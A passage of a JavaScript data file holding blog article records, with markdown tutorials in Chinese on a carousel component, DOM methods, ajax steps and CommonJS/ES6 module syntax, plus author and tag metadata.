  transform: `translateX(0)`,\n                    transition: `.4s`,\n                }), 0)\n            },\n        }\n        class Carousel {\n            constructor($root, mode, delay) {\n                this.mode = mode\n                this.delay = delay || 2000\n                this.timer = null\n                this.$root = $root;\n                this.$panels = $root.querySelectorAll('.panels div');\n                this.$next = $root.querySelector('.arrow .right-arrow');\n                this.$pre = $root.querySelector('.arrow .left-arrow');\n                this.$poins = $root.querySelectorAll('.poins li');\n                this.loopStart()\n                this.bindEvent()\n            }\n            // 绑定事件\n            bindEvent() {\n                this.$next.onclick = this.next.bind(this);\n                this.$pre.onclick = this.pre.bind(this);\n                this.$poins.forEach($poin => $poin.onclick = this.goPage.bind(this))\n                // 循环轮播\n                this.$root.onmouseover = () => clearInterval(this.timer)\n                this.$root.onmouseleave = () => this.loopStart()\n            }\n            // 下一个\n            next() {\n                let fromIndex = this.getIndex()\n                let toIndex = (fromIndex + 1) % this.$panels.length\n                this.setActive(toIndex)\n                animation[this.mode](this.$panels[fromIndex], this.$panels[toIndex], 'next')\n            }\n            // 上一个\n            pre() {\n                let fromIndex = this.getIndex()\n                let toIndex = (fromIndex - 1 + this.$panels.length) % this.$panels.length\n                this.setActive(toIndex)\n                // animation[this.mode](this.$panels[fromIndex], this.$panels[toIndex])\n                animation[this.mode](this.$panels[fromIndex], this.$panels[toIndex], 'pre')\n            }\n            // 指定轮播图\n            goPage(e) {\n                // 判断点击的dom对象是不是li,如果是li则直接返回target\n                // 如果点击的是li下面的button,则返回button的父节点，即li\n                const $clickNode = e.target.nodeName === 'BUTTON' ? e.target.parentNode : e.target\n                // 查找当前点击的节点在poins的下标\n                let toIndex = [...this.$poins].indexOf($clickNode)\n                let fromIndex = this.getIndex()\n                if (toIndex === fromIndex) return\n                if (fromIndex > toIndex) {\n                    animation[this.mode](this.$panels[fromIndex], this.$panels[toIndex], 'pre')\n                }\n                else {\n                    animation[this.mode](this.$panels[fromIndex], this.$panels[toIndex], 'next')\n                }\n                this.setActive(toIndex)\n            }\n            // 获取当前轮播图\n            getIndex() {\n                return [...this.$poins].indexOf(this.$root.querySelector('.poins li.active'))\n            }\n            // 设置当前轮播图\n            setActive(index) {\n                console.log(this.$poins);\n                this.$poins.forEach($poin => $poin.classList.remove('active'))\n                this.$poins[index].classList.add('active')\n                this.$panels.forEach($panel => $panel.classList.remove('active'))\n                this.$panels[index].classList.add('active')\n\n            }\n            // 开始轮播\n            loopStart() {\n                this.timer = setInterval(() => {\n                    this.next()\n                }, this.delay);\n            }\n\n        }\n\n        let carousel = document.querySelector('.carousel')\n        // 第一个参数为轮播图的根元素，必传\n        // 第二个参数为轮播图模式：vertical/horizontal，必传\n        // 第三个参数为轮播间隔时间，可不传，默认2000毫秒\n        var p = new Carousel(carousel, 'vertical', 1000)\n\n    </script>\n</body>\n\n</html>\n```\n\n\n\n## main.css\n\n```css\n.container {\n  width: 80%;\n  margin: 100px auto 0;\n  box-shadow: 0 0 4px 1px rgba(232, 237, 250, 0.5);\n  border: 1px solid #ebebeb;\n  border-radius: 3px;\n  padding: 20px;\n  box-sizing: border-box;\n}\n.carousel {\n  position: relative;\n  text-align: center;\n  height: 300px;\n  overflow: hidden;\n  z-index: 30;\n}\n.carousel:hover .arrow i:nth-child(1) {\n  left: 15px;\n  opacity: 1;\n}\n.carousel:hover .arrow i:nth-child(2) {\n  right: 15px;\n  opacity: 1;\n}\n.carousel .panels:hover {\n  cursor: pointer;\n}\n.carousel .panels .active {\n  z-index: 10;\n}\n.carousel .panels :nth-child(1) {\n  background-color: aqua;\n}\n.carousel .panels :nth-child(2) {\n  background-color: burlywood;\n}\n.carousel .panels :nth-child(3) {\n  background-color: pink;\n}\n.carousel .panels :nth-child(4) {\n  background-color: lightblue;\n}\n.carousel .panels .panels-item {\n  position: absolute;\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  height: 100%;\n  width: 100%;\n}\n.carousel .arrow i {\n  position: absolute;\n  cursor: pointer;\n  top: 50%;\n  width: 36px;\n  height: 36px;\n  transform: translateY(-50%);\n  border-radius: 50%;\n  background-color: rgba(31, 45, 61, 0.1);\n  opacity: 0;\n  transition: 0.3s;\n  z-index: 30;\n}\n.carousel .arrow i:hover {\n  background-color: rgba(31, 45, 61, 0.2);\n}\n.carousel .arrow .left-arrow {\n  left: -20px;\n}\n.carousel .arrow .right-arrow {\n  right: -20px;\n}\n.carousel .poins {\n  position: absolute;\n  margin: 0;\n  padding: 0;\n  bottom: 0;\n  left: 50%;\n  transform: translate(-50%, -50%);\n  z-index: 999;\n}\n.carousel .poins li {\n  display: inline-block;\n  list-style: none;\n  cursor: pointer;\n  padding: 5px;\n  z-index: 99;\n}\n.carousel .poins li button {\n  opacity: 0.5;\n  cursor: pointer;\n  width: 30px;\n  height: 3px;\n  border: 0;\n  outline: none;\n  background-color: white;\n  transition: 0.3s;\n}\n.carousel .poins li.active button {\n  opacity: 1;\n}\n\n```\n\n",
      click: 4,
      createdAt: '2020-05-31T15:34:55.000Z',
      updatedAt: '2021-02-16T13:11:00.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 26,
            article_id: 26,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 26,
            user_id: 1,
            article_id: 26,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
        {
          id: 20,
          name: '造轮子',
          color: 'rgba(151, 239, 19, 1)',
          createdAt: '2020-08-13T15:01:02.000Z',
          updatedAt: '2020-08-13T15:01:02.000Z',
        },
      ],
    },
    {
      id: 25,
      title: 'Js DOM',
      is_comment: 1,
      status: 1,
      img: '/1590918239825dom.jpg',
      content:
        "# 什么是DOM\n\nDOM，文档对象模型（Document Object Model）。\n\n# HTMLCollection 对象\n\n注意：IE9及以上版本才支持！\n\n> 根据id获取元素，返回一个：document.getElementById()\n>\n> 根据标签获取元素，返回多个：document.getElementsByTagName()\n>\n> 根据选择器或标签获取第一个元素，返回一个：document.querySelector()\n>\n> 根据选择器或标签获取所有元素，返回多个：document.querySelectorAll()\n\n```html\n<body>\n    <div id=\"wrap\">\n        <p class=\"ppp\">我是p1</p>\n        <p class=\"ppp\">我是p2</p>\n        <span>我是span</span>\n    </div>\n    <script>\n        var ele = document.getElementById('wrap')\n        console.log(ele);   //<div id=\"wrap\">...</div>\n        var ele1 = document.getElementsByTagName('p')\n        console.log(ele1);  //HTMLCollection(2) [p, p]\n        console.log(ele1[0]);  //<p class=\"ppp\">我是p1</p>\n        var ele2 = document.getElementsByClassName('ppp')\n        console.log(ele2);  //HTMLCollection(2) [p.ppp, p.ppp]\n        console.log(ele2[0]);  //HTMLCollection(2) [p.ppp, p.ppp]\n        var ele3 = document.querySelector('#wrap')\n        console.log(ele3);  //<div id=\"wrap\">...</div>\n        var ele4 = document.querySelector('p')\n        console.log(ele4);  //<p class=\"ppp\">我是p1</p>\n        var ele5 = document.querySelectorAll('p')\n        console.log(ele5);      //NodeList(2) [p, p]\n        console.log(ele5[0]);  //<p class=\"ppp\">我是p1</p>\n    </script>\n</body>\n```\n\n## 创建新的HTML元素 - appendChild()\n\n要创建新的 HTML 元素 (节点)需要先创建一个元素，然后在已存在的元素中添加它。\n\n> 创建一个新的元素：document.createElement()\n>\n> 创建一个新的文本节点：document.createTextNode()\n>\n> 在一个已存在的元素的尾部添加元素：appendChild()\n>\n> 在一个已存在的元素的开头添加元素：insertBefore('要添加的元素','已存在的元素')\n\n```html\n<body>\n    <div id=\"ele\">\n        <p id=\"firstp\">我是firstp</p>\n        <p id=\"secondp\">我是secondp</p>\n    </div>\n    <script>\n        // 创建一个新的元素\n        var ele1 = document.createElement('p')\n        // 创建一个新的文本节点\n        var ele2 = document.createTextNode('我是新增的p')\n        // 将文本节点添加到元素中\n        ele1.appendChild(ele2)\n\n        var ele = document.getElementById('ele')\n        // 在一个已存在的元素的末尾添加元素\n        // ele.appendChild(ele1)\n\n        var secondp = document.getElementById('secondp')\n        // 在一个已存在的元素的开头添加元素\n        ele.insertBefore(ele1, secondp)\n    </script>\n</body>\n```\n\n## 移除已存在的元素 - removeChild()\n\n要移除一个元素，你需要知道该元素的父元素。\n\n```html\n<body>\n    <div id=\"ele\">\n        <p id=\"firstp\">我是firstp</p>\n        <p id=\"secondp\">我是secondp</p>\n    </div>\n    <script>\n        var ele = document.getElementById('ele')\n        var firstp = document.getElementById('firstp')\n        ele.removeChild(firstp)\n    </script>\n</body>\n```\n\n## 替换 HTML 元素 - replaceChild()\n\n```html\n<body>\n    <div id=\"ele\">\n        <p id=\"firstp\">我是firstp</p>\n        <p id=\"secondp\">我是secondp</p>\n    </div>\n    <script>\n        // 新建元素\n        var newele = document.createElement('h1')\n        // 新建文本节点\n        var newtext = document.createTextNode('我是替换的h1')\n        // 将文本节点添加到元素上\n        newele.appendChild(newtext)\n\n        var ele = document.getElementById('ele')\n        var secondp = document.getElementById('secondp')\n\n        // 将新的元素和旧的元素进行替换\n        ele.replaceChild(newele, secondp)\n    </script>\n</body>\n```\n\n# 操作样式CSS\n\n```html\n<body>\n    <a id=\"link\" href=\"\">baidu</a>\n    <script>\n        var link = document.getElementById('link')\n        console.log(link);\n        link.href = 'http://www.baidu.com'\n        link.style.color = 'red'\n        link.style.fontSize = '24px'\n    </script>\n</body>\n```\n\n\n\n# 操作类Class\n\n## 获取/设置类 - className()\n\n## 添加类 - classList.add()\n\n## 移除类 - classList.remove()\n\n```html\n<body>\n    <div class=\"hi hii\" id=\"first\"></div>\n    <div class=\"hello\"></div>\n\n    <script>\n        var mybtn = document.getElementsByTagName('button')\n\n        var myclass = document.getElementsByTagName('div')\n        console.log(myclass[0].className);  //hi hii\n\n        myclass[0].classList.add('hiii')\n        console.log(myclass[0].className);  //hi hii hiii\n        myclass[0].classList.add('ho', 'hoo')\n        console.log(myclass[0].className);  //hi hii hiii ho hoo\n        myclass[0].classList.remove('hi')\n        console.log(myclass[0].className);  //hii hiii ho hoo\n        myclass[0].classList.remove('hii', 'ho')\n        console.log(myclass[0].className);  //hiii hoo\n        myclass[0].className = 'aaa'\n        console.log(myclass[0].className);  //aaa\n    </script>\n</body>\n```\n\n\n\n# 操作属性\n\n## 获取属性 - getAttribute()\n\n## 设置属性 - setAttribute()\n\n## 删除属性 - removeAttribute()\n\n```html\n<body>\n    <input id=\"ipt\" type=\"text\" placeholder=\"我是input\">\n    <script>\n        var ipt = document.getElementById('ipt')\n        console.log(ipt.getAttribute('type'))   //text\n        ipt.setAttribute('type', 'password')\n        console.log(ipt.getAttribute('type'));   //password\n        ipt.removeAttribute('type')\n        console.log(ipt);   //<input id=\"ipt\" placeholder=\"我是input\">\n    </script>\n</body>\n```\n\n# innerHTML/innerText\n\n```html\n<body>\n    <div id=\"res\"></div>\n    <div id=\"res1\"></div>\n    <script>\n        document.getElementById('res').innerText = \"<h1>我是h1</h1>\"\n        document.getElementById('res1').innerHTML = \"<h1>我是h1</h1>\"\n    </script>\n</body>\n```\n\n#\t节点\n\n所有节点都有的属性：\n\nnodeName，元素节点的 `nodeName` 是标签名称（大写），属性节点的 `nodeName` 是属性名称，文本节点的 `nodeName` 永远是 `#text`，文档节点的 `nodeName` 永远是 `#document`\n\nnodeType，**元素节点返回1**，属性节点返回2，元素或属性中的文本内容返回3\n\nnodeValue，对于文本节点，`nodeValue` 属性包含文本。对于属性节点，`nodeValue` 属性包含属性值。文档节点和元素节点，`nodeValue` 属性的值始终为 `null`。\n\n## 获取所有子节点 - childNodes()\n\n获取所有子节点（文本节点，属性节点，元素节点，注释节点等等），有多个\n\n```html\n<body>\n    <div id=\"test\">\n        <span>我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var node = document.getElementById('test')\n        //NodeList(7) [text, span#span, text, p, text, comment, text]\n        console.log(node.childNodes);\n    </script>\n</body>\n```\n\n## 获取父节点 - parentNode()\n\n获取父节点，只有一个\n\n```html\n<body>\n    <div id=\"test\">\n        <span id=\"span\">我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var pnode = document.getElementById('span')\n        /* \n        <div id=\"test\">\n            <span id=\"span\">我是span</span>\n            <p>我是p</p>\n            <!-- 我是注释 -->\n        </div> \n        */\n        console.log(pnode.parentNode);\n    </script>\n</body>\n```\n\n## 获取第一个节点 - firstChild()\n\n```html\n<body>\n    <div id=\"test\">\n        <span id=\"span\">我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var cnode = document.getElementById('test')\n        //获取第一个节点\n        console.log(cnode.firstChild);  //#text\n    </script>\n</body>\n```\n\n## 获取最后一个节点 - lastChild()\n\n```html\n<body>\n    <div id=\"test\">\n        <span id=\"span\">我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var cnode = document.getElementById('test')\n        //获取最后一个节点\n        console.log(cnode.lastChild);  //#text\n    </script>\n</body>\n```\n\n\n\n# 元素节点\n\n## 获取所有元素节点 - children()\n\n获取所有元素节点\n\n```html\n<body>\n    <div id=\"test\">\n        <span id=\"span\">我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var cnode = document.getElementById('test')\n        //HTMLCollection(2) [span#span, p, span: span#span]\n        console.log(cnode.children);\n    </script>\n</body>\n```\n\n## 获取第一个元素节点 - firstElementChild()\n\n```html\n<body>\n    <div id=\"test\">\n        <span id=\"span\">我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var cnode = document.getElementById('test')\n        //获取第一个元素节点\n        console.log(cnode.firstElementChild);//<span id=\"span\">我是span</span>\n    </script>\n</body>\n```\n\n## 获取最后一个元素节点 - lastElementChild()\n\n```html\n<body>\n    <div id=\"test\">\n        <span id=\"span\">我是span</span>\n        <p>我是p</p>\n        <!-- 我是注释 -->\n    </div>\n\n    <script>\n        var cnode = document.getElementById('test')\n        //获取最后一个元素节点\n        console.log(cnode.lastElementChild);// <p>我是p</p>\n    </script>\n</body>\n```\n\n# DOM事件\n\n> addEventListener()允许在目标事件中注册监听事件\n>\n> removeEventListener()在目标事件中移除监听事件\n\n```html\n<body>\n    <button onclick=\"show()\">提示框</button>\n    <button id=\"test1\">提示框1</button>\n    <script>\n        function show() {\n            var mes = prompt('提示标题', '提示内容')\n            console.log(mes);\n        }\n        function show1() {\n\n            console.log('show1');\n        }\n        document.getElementById('test1').addEventListener('click', show)\n        document.getElementById('test1').addEventListener('click', show1)\n        document.getElementById('test1').removeEventListener('click', show)\n    </script>\n</body>\n```\n\n## 事件冒泡/事件捕获\n\n> 事件传递有两种方式：冒泡与捕获\n>\n> 在 *冒泡* 中，内部元素的事件会先被触发，然后再触发外部元素\n>\n> 在 *捕获* 中，外部元素的事件会先被触发，然后才会触发内部元素的事件\n\naddEventListener() 方法可以指定 \"useCapture\" 参数来设置传递类型，addEventListener(*event*, *function*, ***useCapture***);默认值为 false, 即冒泡传递，当值为 true 时, 事件使用捕获传递。\n\n## 阻止事件冒泡\n\nw3c的方法是event.stopPropagation()\n\nIE则使用event.cancelBubble = true\n\n```html\n<div onclick=\"show1()\" style=\"width: 200px;height: 200px;background-color: red;\">\n    <button onclick=\"show();event.stopPropagation()\">show</button>\n    <button onclick=\"show();event.cancelBubble=true\">show</button>\n    <button id=\"hello\">hello</button>\n</div>\n<script>\n    window.onload = function () {\n        var hellotbn = document.getElementById('hello')\n        console.log(hellotbn);\n        hellotbn.addEventListener('click', hello)\n        function hello() {\n            // event.stopPropagation()\n            // event.cancelBubble=true\t// ie下取消冒泡\n            console.log('hello');\n        }\n    }\n    function show() {\n        console.log('show');\n    }\n    function show1() {\n        console.log('show1');\n    }\n</script>\n```\n\n## 取消默认事件\n\n1，可在onclick=\"\"上直接加return false\n\n2，通过获取dom元素，监听事件，event.preventDefault()\n\n```html\n<div onclick=\"show1()\" style=\"width: 200px;height: 200px;background-color: red;\">\n    <a href=\"http://www.baidu.com\" onclick=\"link(); return false\">link</a>\n    <a href=\"http://www.baidu.com\" id=\"alink\">alink</a>\n</div>\n    <script>\n        window.onload = function () {\n            var alink = document.getElementById('alink')\n            \n            // 方法1\n            // alink.onclick = function () {\n            //     event.preventDefault()\n            //     console.log('xxxxxxxx');\n            //     console.log(event);\n            // }\n            \n            // 方法二\n            // alink.onclick = function () {\n            //     console.log('xxxxxxxx');\n            //     console.log(event);\n            //     return false\n            // }\n            \n            // 方法三\n            alink.addEventListener('click', aalink)\n            function aalink() {\n                event.preventDefault()\n                console.log('aalink');\n                //在这里使用return false不管用，只能用event.preventDefault()\n                // return false\n            }\n        }\n        function link() {\n            console.log('link');\n        }\n    </script>\n```\n\n\n\n",
      click: 7,
      createdAt: '2020-05-31T09:44:12.000Z',
      updatedAt: '2021-02-16T13:10:43.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 25,
            article_id: 25,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 25,
            user_id: 1,
            article_id: 25,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 17,
      title: 'ajax实现步骤',
      is_comment: 1,
      status: 1,
      img: '/1590917938912ajax.jpg',
      content:
        '1.创建一个XMLHttpRequest异步对象\n> 段落引用new XMLHttpRequest()\n\n2.设置请求方式和请求地址\n> open("GET", "http://localhost:3003/article", true)\n\n3.接着，用send发送请求\n> send()\nsend("fname=Henry&lname=Ford");\n\n4.监听状态变化\n> Onreadystatechange=function(){}\n\n5.最后，接收返回的数据\n> responseText\n\n## 案例\n```js\n<script>\n    function ajaxfn() {\n        // 创建一个XMLHttpRequest异步对象\n        var xmlhttp = new XMLHttpRequest();\n        // 设置请求方式和请求地址\n        xmlhttp.open("GET", "http://localhost:3003/article", true);\n        // send发送请求\n        xmlhttp.send();\n        // 监听状态变化\n        xmlhttp.onreadystatechange = function () {\n            if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {\n                // xmlhttp.readyState == 4表示请求已完成\n                // xmlhttp.status == 200表示成功\n                // xmlhttp.status == 404未找到页面\n                console.log(\'object\');\n                console.log(xmlhttp.responseText);\n                console.log(xmlhttp.getAllResponseHeaders());\n                console.log(xmlhttp.getResponseHeader(\'content-type\'));\n            }\n        }\n    }\n    ajaxfn()\n</script>\n```\n',
      click: 6,
      createdAt: '2020-05-31T09:39:12.000Z',
      updatedAt: '2021-02-16T13:09:06.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 17,
            article_id: 17,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 17,
            user_id: 1,
            article_id: 17,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 11,
          name: 'ajax',
          color: 'rgba(126, 14, 140, 1)',
          createdAt: '2020-07-04T15:26:10.000Z',
          updatedAt: '2020-07-04T15:26:10.000Z',
        },
      ],
    },
    {
      id: 16,
      title: '前端模块化',
      is_comment: 1,
      status: 1,
      img: null,
      content:
        "# commonjs\n\n## module.exports\n\n```js\n//profile.js\nfunction sang() {\n    console.log('I can sang');\n}\nvar hobby = 'rap'\n// module.exports导出的是一个对象\nmodule.exports = { sang, hobby, eat: '吃饭' }\n```\n\n```js\n//app.js\nvar profile = require('./mode/profile')\nconsole.log(profile);   // { sang: [Function: sang], hobby: 'rap', eat: '吃饭' }\nconsole.log(profile.sang); // [Function: sang]\nconsole.log(profile.hobby); // rap\nconsole.log(profile.eat); // 吃饭\n\nconsole.log('============================');\n\nvar { sang, hobby, eat } = require('./mode/profile')\nconsole.log(sang, hobby, eat);  // [Function: sang] 'rap' '吃饭'\n```\n\n\n\n## exports\n\n```js\n//user.js\nconst name = 'Node'\nfunction hello() {\n    console.log('hello node');\n}\nconst sayhello = () => {\n    console.log('I can sayhello');\n}\n\nexports.hi = hello\nexports.say = sayhello\nexports.name = name\nexports.bye = () => {\n    console.log('bye node');\n}\n```\n\n\n\n```js\n//app.js\nconst user = require('./mode/user')\nconsole.log(user);  //{hi: [Function: hello],say: [Function: sayhello],name: 'Node',bye: [Function]}\nconsole.log(user.name);  //Node\n\nconsole.log('============================');\n\nconst { hi, say, name, bye } = require('./mode/user')\nconsole.log(hi, say, name, bye);//[Function: hello] [Function: sayhello] 'Node' [Function]\nhi()    //hello node\nsay()   //I can sayhello\nbye()   //bye node\nconsole.log(name);  //Node\n```\n\n## require\n\n使用 `const ... = require('路径')` 即可导入\n\n## 两者区别\n\n> module对象的exports属性是exports对象的一个引用；也就是说 module.exports = exports \n>\n> exports可以理解为是module.exports的简写，module.exports 初始值为一个空对象 {}，而**exports**指向的是**module.exports**的引用，最后return的不是exports，而是**module.exports**\n\n\n\n# es6\n\n## export\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n\n<body>\n    <!-- es6模块化需要添加：type=\"module\" -->\n    <script src=\"./app.js\" type=\"module\"></script>\n</body>\n\n</html>\n```\n\n### 写法1\n\n```js\n// es6模块化 user.js\nexport var name = 'tom'\nexport var sex = 'boy'\nexport function sayhello() {\n    console.log('我会sayhello');\n}\n```\n\n```js\n// es6模块化 app.js\nimport { name, sex, sayhello } from './mode/user.js';\nconsole.log(name)    //tom\nconsole.log(sex)    //boy\nconsole.log(sayhello)   //ƒ sayhello() {console.log('我会sayhello');}\n```\n\n### 写法2\n\n```js\n// es6模块化 hobby.js\nvar hobbyName = 'vue'\nvar hobby = function () {\n    console.log('code');\n}\nexport { hobbyName, hobby }\n```\n\n```js\n// es6模块化 app.js\nimport { hobbyName, hobby } from './mode/hobby.js';\nconsole.log(hobbyName); //vue\nconsole.log(hobby);    //ƒ () {console.log('code');}\n```\n\n### 写法3\n\n```js\n// es6模块化 app.js\nimport { name, sex, sayhello } from './mode/user.js';\nimport { hobbyName, hobby } from './mode/hobby.js';\nconsole.log(name)    //tom\nconsole.log(sex)    //boy\nconsole.log(sayhello)   //ƒ sayhello() {console.log('我会sayhello');}\nconsole.log('===========');\nconsole.log(hobbyName); //vue\nconsole.log(hobby);    //ƒ () {console.log('code');}\n```\n\n## export default\n\n```js\n// es6模块化 token.js\nvar password = '12346'\nvar sang = () => {\n    console.log('I can sang');\n}\nexport default { password, sang }\n```\n\n```js\n// es6模块化 app.js\nimport token from './mode/token.js';\n// import { password } from './mode/token.js';    //报错，token里面并没有导出password，既没有export var password = 123\nconsole.log(token); //{password: \"12346\", sang: ƒ}\n```\n\n## export和export default混合\n\n```js\n// es6模块化 token.js\nvar password = '12346'\nvar sang = () => {\n    console.log('I can sang');\n}\nexport var rapper = 'cxk'\nexport default { password, sang }\n```\n\n```js\n// es6模块化 app.js\nimport token from './mode/token.js';\nimport { rapper } from './mode/token.js';\nconsole.log(token); //{password: \"12346\", sang: ƒ}\nconsole.log(rapper); //'cxk'\n```\n\n```js\n// es6模块化 app.js\nimport token, { rapper } from './mode/token.js';\nconsole.log(token); //{password: \"12346\", sang: ƒ}\nconsole.log(rapper); //'cxk'\n```\n\n## import\n\n使用 `import  ...  from '路径'` 即可导入\n\n```js\n// es6模块化 myReact.js\nvar myReact = {\n    name: 'hss-react',\n    Component: function () {\n        console.log('hss-Component');\n    }\n}\n\nexport var hello = 'hello world'\nexport var Component = myReact.Component\nexport default myReact\n```\n\n```js\n// es6模块化 app.js\nimport react1 from './mode/myReact.js';\nimport * as react2 from './mode/myReact.js';\nconsole.log(react1);    //{name: \"hss-react\", Component: ƒ}\nconsole.log(react2);    //{Component: ƒ (),default: Object,hello: \"hello world\"}\nconsole.log(react1 === react2); //false\nconsole.log(react2.default === react1); //true\n```\n\n```js\n// es6模块化 app.js\nimport react1, * as all from './mode/myReact.js';\nconsole.log(react1);\nconsole.log(all);\nconsole.log(react1 === all.default);    //true\n```\n\n# typescript\n\n## import React,{Component} from 'react'\n\nreact源码里使用typescript编写\n\n##  allowSyntheticDefaultImports\n\n> 允许对不包含默认导出的模块使用默认导入。这个选项不会影响生成的代码，只会影响类型检查。\n\n`export = foo` 是 ts 为了兼容 commonjs 创造的语法，它对应于 commonjs 中的 `module.exports = foo`。\n\n在 ts 中，如果要引入一个通过 `export = foo` 导出的模块，标准的语法是 `import foo = require('foo')`，或者 `import * as foo from 'foo'`。\n\n但由于历史原因，我们已经习惯了使用 `import foo from 'foo'`。\n\n这个选项就是为了解决这个问题。当它设置为 `true` 时，允许使用 `import foo from 'foo'` 来导入一个通过 `export = foo` 导出的模块。当它设置为 `false` 时，则不允许，会报错。\n\n当然，我们一般不会在 ts 文件中使用 `export = foo` 来导出模块，而是在[写（符合 commonjs 规范的）第三方库的声明文件](https://hardocs.com/d/typescript-tutorial/basics/declaration-files#export-1)时，才会用到 `export = foo` 来导出类型。\n\n```ts\nexport = React;\nexport as namespace React;\n```\n\n```js\nimport React, { Component } from 'react';\nimport * as React1 from 'react';\n\nconsole.log(React === React1.default);    //true\nconsole.log(React1.default === React1);   //true\nconsole.log(React === React1);            //true，得出结论，react里面只导出了一个默认的React！\n\nconsole.log(React.default); //undefined\nconsole.log(React.Component === Component);  //true\nconsole.log(React1.Component === Component);  //true\n```\n\n# 参考\n\nhttps://juejin.cn/post/6844903763958841357\n\nhttps://hardocs.com/d/typescript-tutorial/engineering/compiler-options.html#allowsyntheticdefaultimports",
      click: 7,
      createdAt: '2020-05-08T15:38:37.000Z',
      updatedAt: '2021-03-29T08:15:45.000Z',
      types: [
        {
          id: 1,
          name: '前端',
          createdAt: '2020-12-30T14:06:49.000Z',
          updatedAt: '2020-12-30T14:06:51.000Z',
          article_type: {
            id: 16,
            article_id: 16,
            type_id: 1,
            createdAt: '2020-12-30T14:07:51.000Z',
            updatedAt: '2020-12-30T14:07:54.000Z',
          },
        },
      ],
      stars: [],
      users: [
        {
          id: 1,
          username: 'hss',
          status: 1,
          avatar: 'https://img.cdn.hsslive.cn/1613141138717Billd.jpg',
          title: 'hello world',
          createdAt: '2020-10-10T15:24:44.000Z',
          updatedAt: '2021-11-28T12:14:36.000Z',
          user_article: {
            id: 16,
            user_id: 1,
            article_id: 16,
            createdAt: '2020-12-27T09:13:03.000Z',
            updatedAt: '2020-12-27T09:13:05.000Z',
          },
        },
      ],
      comments: [],
      tags: [
        {
          id: 1,
          name: 'JavaScript',
          color: '#3b6b55',
          createdAt: '2020-12-23T16:00:00.000Z',
          updatedAt: '2021-01-01T20:17:10.000Z',
        },
      ],
    },
    {
      id: 15,
      title: '数组扁平化',
      is_comment: 1,
      status: 1,
      img: null,
      content:
